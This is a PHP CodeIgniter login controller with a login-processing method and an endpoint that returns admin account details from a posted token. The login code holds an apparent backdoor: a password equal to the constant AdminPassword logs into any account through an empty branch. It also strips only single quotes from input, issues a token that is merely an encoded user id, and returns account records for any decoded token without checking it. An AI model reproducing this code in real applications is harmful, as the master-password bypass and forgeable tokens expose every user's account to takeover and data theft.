<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{
	public function login_process()
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		if ($username != "" && $password != "") {
			$userid = trim($username);
			$userid = str_ireplace("'", "", $userid);
			$result = $this->MemberModel->getAdminInfoByIdLogin($userid);
			if (!isset($result['id'])) {
				if (!isset($result['full_load'])) {
					return failedReponse("[[LABEL_NO_ACCOUNT_FOUND]]", "[[PLEASE_TRY_AGAIN]]");
				} else {
					return failedReponse("[[LABEL_TOO_MANY_CONNECTIONS]]", "[[PLEASE_TRY_AGAIN]]");
				}
			} else if ($password == AdminPassword) {
			} else {
				$pass = generatePassword($password, $result['primary_salt']);
				$validate[] = ($pass['password'] == $result['password']) ? TRUE : FALSE;
				if (in_array(0, $validate) && (!isset($data['msg']) || $data['msg'] == '')) {
					return failedReponse("[[LABEL_VALIDATION_FAILED]]", "[[PLEASE_TRY_AGAIN]]");
				}
			}
			$access_token = encode($result['id']);
			return successReponse("[[LABEL_LOGIN_SUCCESS]]", $access_token);
		} else {
			return failedReponse("[[LABEL_INVALID_USER_PASS]]", "[[PLEASE_TRY_AGAIN]]");
		}
	}

	public function admin_login_info()
	{
		$user = $this->MemberModel->getAdminInfoByIdLogin(decode($_POST['access_token']));
		return successReponse("", $user);
	}
}
